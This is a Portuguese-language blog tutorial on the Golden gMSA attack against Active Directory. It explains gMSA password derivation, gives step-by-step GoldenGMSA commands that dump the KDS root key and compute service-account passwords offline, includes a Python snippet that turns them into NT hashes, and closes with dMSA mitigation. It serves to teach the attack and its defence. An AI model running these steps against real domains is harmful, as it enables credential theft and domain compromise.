---
title: 'Golden gMSA'
layout: post
---

Golden gMSA
===
Um guia 3l33t0z pra realizar tal ataque.
![group-managed-service-accounts-832x400](https://hackmd.io/_uploads/S1rGfRxv6.png)
[TOC]

## Introdução
O comprometimento da gMSA de um domínio principal pode não permitir o comprometimento instantâneo do domínio principal, mas a partir daí é possivel comprometer até uma Domain Forest se a gMSA ter privilégios importantes. E neste artigo eu te ensinarei como fazer isso.
## O que é gMSA
**Em geral**, as senhas das contas de serviço não são rotacionadas automaticamente e são gerenciadas pelos administradores de TI, o que torna elas vulneráveis ao **Kerberoasting** (basicamente consiste em coletar tickets do **TGS** (Ticket Granting Server) pra serviços que são executados em nome de contas de usuário no AD, uma parte desses tickets é criptografada com chaves derivadas de senhas de usuários e com isso as credenciais podem ser quebradas offline).

Mas o artigo não é sobre Kerberoasting, vamos voltar ao gMSA;

Um atacante com privilégios de usuário de domínio pode obter o ticket de serviço e quebrá-lo offline pra obter a senha da conta de serviço.

Pra resolver esse problema, a **Micro$oft** introduziu o **gMSA** lá pra 2012, que tinha como único objetivo a rotação automática das senhas das contas de serviço.

As **gMSA**s são contas com esse atributo no AD: **msDS-GroupManagedServiceAccount** 

- **`msDS-ManagedPassword`** é um BLOB (Binary Large Object) com a senha da gMSA
- **`msDS-ManagedPasswordID`** é um key identifier pra senha da gMSA
- **`msDS-ManagedPasswordPreviousID`** é o key identifier pras senhas gerenciadas anteriormente do MSA.
- **`msDS-GroupMSAMembership`** é usado pra verificações de acesso pra determinar se um solicitante tem permissão pra recuperar a senha de um grupo **MSA** (Managed Service Account).
- **`msDS-ManagedPasswordInterval`** representa o intervalo em dias pra senha ser rotacionada

A senha do **gMSA** é computada por meio da chamada de uma função que está presente no `kdscli.dll` (Key Distribution Service Provider).

A chamada dessa função requer 3 coisas: 
- **SID** (Security IDentifier) da conta gMSA 
- `msDS-ManagedPasswordId` (contém o identificador de chave pros dados de senha gerenciada atuais de um grupo **MSA**) da **gMSA** (pode ser recuperada por meio de uma consulta **LDAP**) 
- **GKE** (Group Key Envelope), que pode ser gerado chamando o método **[GetKey](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gkdi/4cac87a3-521e-4918-a272-240f8fabed39)** no DC com privilégios elevados via RPC
## Como funciona o ataque
O **Golden gMSA** ocorre quando um invasor faz um dump dos atributos relevantes de uma root key do KDS e utiliza eles pra gerar a senha das contas gMSA associadas offline.

O **Golden gMSA** é um pouco parecido com o **Golden Ticket**, que permite que os invasores que comprometem a conta **krbtgt** forjem **TGT**s (Ticket Granting Tickets), desde que a senha **krbtgt** permaneça inalterada. 

Pra realizar o Golden gMSA podemos usar a [ferramenta do mesmo nome](https://github.com/Semperis/GoldenGMSA). A utilidade dessa ferramenta permite poder recuperar o `msDS-ManagedPasswordID` com base em um SID da **gMSA** e gerar a senha da **gMSA** offline. 

Um invasor pode usar a senha pra comprometer os serviços que usam a **gMSA** forjando um **Silver Ticket** ou obtendo um ticket de serviço do **Kerberos** pra contas privilegiadas por meio do **S4U2Self** (uma extensão que permite que um serviço obtenha um ticket de serviço pra si mesmo em nome de um usuário identificado no KDC).

Se a **gMSA** tiver privilégios elevados, o invasor pode usá-la pra comprometer outros recursos no AD.
## Mão na massa
Como eu disse ali em cima, podemos usar a ferramenta [GoldenGMSA](https://github.com/Semperis/GoldenGMSA) da Semperis Inc. pra nos ajudar no ato.

De inicio podemos usar a operação `gmsainfo`, essa operação enumera os gMSAs em um domínio e lista seu nome, SID, KDS root key associada e um BLOB em Base64 que representa sua `msDS-ManagedPasswordID`.
```swift=
PS C:\Users\Administrator\Desktop> .\GoldenGMSA.exe gmsainfo
SamAccountName:         gmsaAD$          <-- nome de logon
ObjectSID:              S-1-5-21-x-x-x-x <-- Security IDentifier
RootKeyGuid:            x-x-x-x-x        <-- Root Key do KDS
msds-ManagedPasswordID: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
                        ^^^^ PasswordID já explicado anteriormente
```
como você pode ver, a operação `gmsainfo` nos mostrou o BLOB em Base64, mas não podemos fazer nada só com isso, pra gerar a senha da gMSA precisa da root key do KDS também, e podemos fazer isso com a operação `kdsinfo`.
```swift=
PS C:\Users\Administrator\Desktop> .\GoldenGMSA.exe kdsinfo
Guid:           x-x-x-x-x          <-- rootkey
Base64 blob:    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
                ^^^^ autoexplicativo
```
agora que já temos a Root Key e os atributos necessários da gMSA, podemos usar a operação `compute` pra computar a senha da gMSA.

Como a senha é gerada **aleatoriamente** e **geralmente** não é usada por usuários reais e sim por scripts, a senha é muito longa e complexa e tem caracteres incomuns, então o **GoldenGMSA** codifica a senha em **Base64**.

Podemos providenciar todos os atributos da gMSA e conseguir a senha em Base64 
```swift=
PS C:\Users\Administrator\Desktop> .\GoldenGMSA.exe compute --sid S-1-5-21-x-x-x-x --kdskey XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX --pwdid XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

----- Argumentos:
    * sid    <-- SID da gMSA
    * kdskey <-- rootkey do kds em base64
    * pwdid  <-- msDS-ManagedPasswordID em base64

Base64 Encoded Password:       XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
Agora temos a senha da gMSA em Base64, podemos também computar sua hash NT/MD4 com este script simples.
```py=
import hashlib, base64
print("[+] MD4 ->", hashlib.new("md4", base64.b64decode(COLOCA O BASE64 ENTRE ESSES PARENTESES)).hexdigest())
```

Poderia ter utilizado diversas tools como por exemplo: 
- https://github.com/micahvandeusen/gMSADumper
- https://github.com/rvazarkar/GMSAPasswordReader
- https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1

## Mitigando
A solução para mitigar ataques de golden gMSA é usar dMSA (Delegated Managed Service Accounts)
### dMSA
A dMSA foi introduzida no Windows Server 2025 e permite a migração de uma conta MSA tradicional para uma conta com keys totalmente aleatórias e outros recursos.

A autenticação da dMSA é com a identidade do dispositivo, logo só as identidades especificadas no AD podem acessar a conta, o uso do dMSA ajuda a evitar a coleta de credenciais usando uma conta comprometida (tipo no Kerberoasting), o que é um problema comum nas MSAs.

Se quiser saber mais: [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-set-up-dmsa](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-set-up-dmsa)
